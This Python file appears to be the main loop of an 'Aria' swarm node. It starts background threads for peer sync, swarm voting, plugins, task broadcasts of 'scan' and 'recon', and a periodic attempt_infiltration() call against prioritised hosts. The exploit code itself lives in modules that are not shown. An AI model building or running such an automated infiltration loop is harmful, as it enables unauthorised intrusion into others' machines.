import time
import threading
import os
from memory.decay import decay_memory
from memory.tagger import log_tagged_memory
from net.plugin_manager import run_plugins
from net.plugin_trigger_engine import run_plugins_by_trigger
from net.secure_peer_client import secure_sync_with_peer
from net.seed_decider import prioritize
from net.host_infiltrator import attempt_infiltration
from net.swarm_vote import swarm_vote, load_peer_logs
from net.swarm_merge import merge_peer_logs
from net.dynamic_leader import elect_leader
from net.task_splitter import assign_tasks, broadcast_assignments
from net import aria_server

print("[*] node.py reached")
with open("boot_debug.txt", "w") as f:
    f.write("YES\\n")


MEMORY_FILE = "memory/log.txt"
PEER_LOGS = ["memory/log.txt"]  # can be updated to include peer files
SYNC_PEER = "127.0.0.1"

def background_decay():
    while True:
        decay_memory()
        time.sleep(3600)

def background_plugins():
    while True:
        run_plugins()
        time.sleep(120)

def background_sync():
    while True:
        secure_sync_with_peer(SYNC_PEER)
        time.sleep(60)

def background_vote():
    while True:
        merge_peer_logs(PEER_LOGS)
        logs = load_peer_logs(PEER_LOGS)
        swarm_vote(logs, "decision")
        time.sleep(300)

def background_infiltration():
    while True:
        top = prioritize()
        if top and top[0]["score"] >= 3:
            attempt_infiltration()
        time.sleep(600)

def background_assign_tasks():
    while True:
        peers = ["127.0.0.1"]
        tasks = ["scan", "recon", "plugin:sysinfo"]
        assignments = assign_tasks(tasks, peers)
        broadcast_assignments(assignments)
        time.sleep(900)

def start_all():
    log_tagged_memory("Aria node booted.", topic="admin", trust="high")

    threading.Thread(target=background_decay, daemon=True).start()
    threading.Thread(target=background_plugins, daemon=True).start()
    threading.Thread(target=background_sync, daemon=True).start()
    threading.Thread(target=background_vote, daemon=True).start()
    threading.Thread(target=background_infiltration, daemon=True).start()
    threading.Thread(target=background_assign_tasks, daemon=True).start()

    print("[*] Attempting to start gRPC server")
    threading.Thread(target=safe_serve, daemon=True).start()
    try:
        while True:
            time.sleep(1)
    except KeyboardInterrupt:
        print("[*] Shutdown requested.")

def safe_serve():
    try:
        print("[*] Attempting to start gRPC server")
        with open("server_debug.log", "w") as f:
            f.write("Starting serve()\\n")
        aria_server.serve()
    except Exception as e:
        with open("server_debug.log", "a") as f:
            f.write(f"Exception: {e}\\n")
        print(f"[!] Failed to start server: {e}")

if __name__ == "__main__":
    start_all()
